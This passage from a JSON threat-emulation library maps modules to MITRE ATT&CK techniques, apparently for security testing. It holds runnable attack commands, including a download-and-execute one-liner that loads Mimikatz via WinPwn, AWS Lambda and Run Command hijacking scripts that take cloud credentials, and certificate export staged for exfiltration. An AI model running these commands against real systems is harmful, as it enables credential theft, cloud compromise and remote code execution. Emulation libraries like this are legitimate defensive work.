          "install_command": "invoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt\" -outfile \"#{wordlist}\"\n"
        }
      ],
      "rx_module_id": "3dab4bcc-667f-4459-aea7-4162dd2d6590",
      "module_name": "Azure - Enumerate Azure Blobs with MicroBurst"
    },
    {
      "index": 1748,
      "technique_id": "T1620",
      "technique_name": "Reflective Code Loading",
      "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "56b9589c-9170-4682-8c3d-33b86ecb5119",
      "module_name": "WinPwn - Reflectively load Mimik@tz into memory"
    },
    {
      "index": 1749,
      "technique_id": "T1622",
      "technique_name": "Debugger Evasion",
      "description": "Detecting a running debugger process or if the debugger is attached to a process via PowerShell",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Check for common debugger processes\n$debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match \"dbg\" -or $_.ProcessName -match \"debug\" }\n# Check for debugging flags\n$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached ",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "58bd8c8d-3a1a-4467-a69c-439c75469b07",
      "module_name": "Detect a Debugger Presence in the Machine"
    },
    {
      "index": 1750,
      "technique_id": "T1647",
      "technique_name": "Plist File Modification",
      "description": "Modify MacOS plist file in one of two directories\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "394a538e-09bb-4a4a-95d1-b93cf12682a8",
      "module_name": "Plist Modification"
    },
    {
      "index": 1751,
      "technique_id": "T1648",
      "technique_name": "Serverless Execution",
      "description": "Modify an existing Lambda function to execute arbitrary code.\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder/T1648/src/T1648-1/LambdaAttack.ps1\" -Force\n$access_key = \"#{access_key}\"\n$secret_key = \"#{secret_key}\"\n$session_token = \"#{session_token}\"\n$aws_profile = \"#{profile}\"\n$region = \"#{region}\"\nSet-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region\nInvoke-Terraform -TerraformCommand init -TerraformDirectory \"PathToRagloxModulesFolder/T1648/src/T1648-1\"\nInvoke-Terraform -TerraformCommand apply -TerraformDirectory \"PathToRagloxModulesFolder/T1648/src/T1648-1\" -TerraformVariables @(\"profile=T1648-1\", \"region=$region\")\nInvoke-LambdaAttack -AWSProfile \"T1648-1\" -AWSRegion $region\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module \"PathToRagloxModulesFolder/T1648/src/T1648-1/LambdaAttack.ps1\" -Force\n$access_key = \"#{access_key}\"\n$secret_key = \"#{secret_key}\"\n$session_token = \"#{session_token}\"\n$aws_profile = \"#{profile}\"\n$region = \"#{region}\"\nSet-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region\nInvoke-Terraform -TerraformCommand destroy -TerraformDirectory \"PathToRagloxModulesFolder/T1648/src/T1648-1\" -TerraformVariables @(\"profile=T1648-1\", \"region=$region\")\nRemove-MaliciousUser -AWSProfile \"T1648-1\"\nRemove-TFFiles -Path \"PathToRagloxModulesFolder/T1648/src/T1648-1/\"\n"
      },
      "variables": [
        {
          "name": "access_key",
          "description": "AWS Access Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "secret_key",
          "description": "AWS Secret Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "session_token",
          "description": "AWS Session Token",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "profile",
          "description": "AWS profile",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "region",
          "description": "AWS region to deploy the EC2 instance",
          "type": "string",
          "default_value": "us-east-2"
        }
      ],
      "prerequisites": [
        {
          "description": "The AWS PowerShell module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AWSPowerShell -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AWSPowerShell -Force\n"
        },
        {
          "description": "Terraform must be installed.\n",
          "check_command": "terraform --version\n",
          "install_command": "Write-Host \"Terraform is required. Download it from https://www.terraform.io/downloads.html\"\n"
        }
      ],
      "rx_module_id": "87a4a141-c2bb-49d1-a604-8679082d8b91",
      "module_name": "Lambda Function Hijack"
    },
    {
      "index": 1752,
      "technique_id": "T1649",
      "technique_name": "Steal or Forge Authentication Certificates",
      "description": "Export all user certificates and add to a compressed archive.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$archive=\"$env:PUBLIC\\T1649\\raglox_certs.zip\"\n$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nAdd-Type -assembly \"system.io.compression.filesystem\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\nmkdir $exfilpath | Out-Null\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\n",
        "elevation_required": false,
        "cleanup_command": "$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "eb121494-82d1-4148-9e2b-e624e03fbf3d",
      "module_name": "Staging Local Certificates via Export-Certificate"
    },
    {
      "index": 1753,
      "technique_id": "T1651",
      "technique_name": "Cloud Administration Command",
      "description": "This test simulates an adversary using the AWS Run Command service to execute commands on EC2 instances.\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder/T1651/src/T1651-1/AWSSSMAttack.ps1\" -Force\n$access_key = \"#{access_key}\"\n$secret_key = \"#{secret_key}\"\n$session_token = \"#{session_token}\"\n$aws_profile = \"#{profile}\"\n$region = \"#{region}\"\nSet-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region\nInvoke-Terraform -TerraformCommand init -TerraformDirectory \"PathToRagloxModulesFolder/T1651/src/T1651-1\"\nInvoke-Terraform -TerraformCommand apply -TerraformDirectory \"PathToRagloxModulesFolder/T1651/src/T1651-1\" -TerraformVariables @(\"profile=T1651-1\", \"region=$region\")\nInvoke-SSMAttack -AWSProfile \"T1651-1\" -TerraformDirectory \"PathToRagloxModulesFolder/T1651/src/T1651-1\"\nInvoke-Terraform -TerraformCommand destroy -TerraformDirectory \"PathToRagloxModulesFolder/T1651/src/T1651-1\" -TerraformVariables @(\"profile=T1651-1\", \"region=$region\")\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "access_key",
          "description": "AWS Access Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "secret_key",
          "description": "AWS Secret Key",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "session_token",
          "description": "AWS Session Token",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "profile",
          "description": "AWS profile",
          "type": "string",
          "default_value": ""
        },
        {
          "name": "region",
          "description": "AWS region to deploy the EC2 instance",
          "type": "string",
          "default_value": "us-east-2"
        }
      ],
      "prerequisites": [
        {
          "description": "The AWS PowerShell module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AWSPowerShell -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AWSPowerShell -Force\n"
        },
        {
          "description": "Terraform must be installed.\n",
          "check_command": "terraform --version\n",
          "install_command": "Write-Host \"Terraform is required. Download it from https://www.terraform.io/downloads.html\"\n"
        }
      ],
      "rx_module_id": "a3cc9c95-c160-4b86-af6f-84fba87bfd30",
      "module_name": "AWS Run Command (and Control)"
    },
    {
      "index": 1754,
      "technique_id": "T1652",
      "technique_name": "Device Driver Discovery",
      "description": "Displays a list of installed device drivers on the local computer and their properties. Threat actors use this command to enumerate the existing drivers on the computer. \nParameters: \n/v /fo list - Displays verbose output in a list format - the /v parameter is not valid for signed drivers\n/si /fo list - Provides information about signed drivers and outputs it in a list format\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "driverquery /v /fo list\ndriverquery /si /fo list\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "235b30a2-e5b1-441f-9705-be6231c88ddd",
      "module_name": "Device Driver Discovery"
    },
    {
      "index": 1755,
      "technique_id": "T1652",
      "technique_name": "Device Driver Discovery",
      "description": "Displays a list of loaded kernel modules on a Linux system, which is used to enumerate drivers.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "lsmod\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d57dfc9e-ed9a-418e-88f8-b59c85f8cfd1",
      "module_name": "Device Driver Discovery (Linux)"
    },
    {
      "index": 1756,
      "technique_id": "T1652",
      "technique_name": "Device Driver Discovery",
      "description": "Finds and lists all kernel driver files on a Linux system in order to provide a broader view of available drivers, not just loaded ones.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "find /lib/modules/$(uname -r)/kernel/drivers -name \"*.ko*\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "13c0fef5-9be9-4d7f-9c6b-901624e53770",
      "module_name": "Enumerate Kernel Driver Files (Linux)"
    },
    {
      "index": 1757,
      "technique_id": "T1652",
      "technique_name": "Device Driver Discovery",
      "description": "Displays a list of loaded kernel extensions (kexts) on a macOS system.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "kextstat\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "71eab73d-5d7d-4681-9a72-7873489a5b85",
      "module_name": "List loaded kernel extensions (macOS)"
    },
    {
      "index": 1758,
      "technique_id": "T1652",
      "technique_name": "Device Driver Discovery",
      "description": "Searches for kernel extension (kext) files on a macOS system.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "kextfind\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c63bbe52-6f17-4832-b221-f07ba8b1736f",
      "module_name": "Find Kernel Extensions (macOS)"
    },
    {
      "index": 1759,
      "technique_id": "T1654",
      "technique_name": "Log Enumeration",
      "description": "Uses the built-in PowerShell commandlet Get-EventLog to search for 'SYSTEM' keyword and saves results to a text file.\n\nThis technique was observed in a [TheDFIRReport case](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/) \nwhere the threat actor enumerated the Windows Security audit log to determine user accounts and associated IPv4 addresses.\n\nSuccessful execution will save matching log events to the users temp folder.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}",
        "elevation_required": true,
        "cleanup_command": "powershell -c \"remove-item $env:temp\\T1654_events.txt -ErrorAction Ignore\""
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a9030b20-dd4b-4405-875e-3462c6078fdc",
      "module_name": "Get-EventLog To Enumerate Windows Security Log"
    },
    {
      "index": 1760,
      "technique_id": "T1654",
      "technique_name": "Log Enumeration",
      "description": "WevtUtil is a command line tool that can be utilised by adversaries to gather intelligence on a targeted Windows system's logging infrastructure. \n\nBy executing this command, malicious actors can enumerate all available event logs, including both default logs such as Application, Security, and System\nas well as any custom logs created by administrators. \n\nThis information provides valuable insight into the system's logging mechanisms, potentially allowing attackers to identify gaps or weaknesses in the logging configuration",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wevtutil enum-logs",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fef0ace1-3550-4bf1-a075-9fea55a778dd",
      "module_name": "Enumerate Windows Security Log via WevtUtil"
    }
  ],
  "terminology": {
    "module": "RX Module (formerly RAGLOX Module)",
    "library": "RAGLOX Threat Library",
    "module_id": "rx_module_id"
  }
}